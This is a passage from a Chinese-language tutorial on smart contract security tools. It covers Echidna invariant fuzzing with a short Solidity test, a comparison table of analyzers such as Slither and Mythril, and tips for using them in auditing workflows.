1. 定义属性（不变量）：例如 `token.totalSupply() == initialSupply`
2. Echidna 生成大量随机交易
3. 检查属性是否始终成立
4. 如果属性被破坏，报告导致破坏的交易序列

**示例：**
```solidity
// 测试用例：定义不变量
contract TestToken is Token {
    function echidna_total_supply_constant() public view returns (bool) {
        // 总供应量应该始终等于初始供应量（假设没有 mint/burn）
        return totalSupply() == INITIAL_SUPPLY;
    }
}
```

### 9.6 工具对比

| 工具 | 类型 | 分析对象 | 速度 | 优点 | 缺点 |
|------|------|---------|------|------|------|
| **Slither** | 静态分析 | 源代码 | 快 | 速度快、可扩展、信息丰富 | 误报率较高 |
| **Mythril** | 符号执行 | 字节码 | 中 | 检测准确率高 | 速度较慢 |
| **Manticore** | 符号执行 | 字节码 | 慢 | 功能强大 | 速度慢，学习曲线陡 |
| **Echidna** | 模糊测试 | 字节码 | 中 | 发现逻辑漏洞 | 需要编写属性 |
| **Oyente** | 符号执行 | 字节码 | 中 | 经典工具 | 维护不活跃 |

### 9.7 工具使用建议

1. **先用 Slither 做快速扫描**：快速发现明显问题
2. **再用 Mythril 深入分析**：检测更深层的漏洞
3. **结合人工审查**：工具不能替代人工
4. **编写单元测试和模糊测试**：提高代码质量
5. **集成到 CI/CD**：每次提交都自动检查
